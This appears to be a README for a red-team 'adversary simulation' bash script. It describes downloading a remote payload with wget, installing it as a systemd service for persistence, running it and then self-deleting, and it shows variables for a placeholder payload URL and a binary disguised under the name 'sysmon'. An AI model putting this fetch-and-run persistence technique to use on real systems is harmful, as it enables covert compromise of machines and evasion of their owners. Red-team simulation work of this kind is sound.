# service.sh
This simple bash script was created for adversary simulation.

This bash script automates the download of a remote payload using wget, creates a systemd service for persistence and executes the payload ([T1543.002](https://attack.mitre.org/techniques/T1543/002/)). The bash script then self-deletes after successful execution.

Replace wget or include curl, python or any [GTFOBins](https://gtfobins.github.io/#+file%20download)

# Replace these variables with your specific values
```shell
BINARY_NAME="sysmon"
BINARY_URL="http://IP:PORT/sysmon"
INSTALL_PATH="/usr/local/bin/${BINARY_NAME}"
```
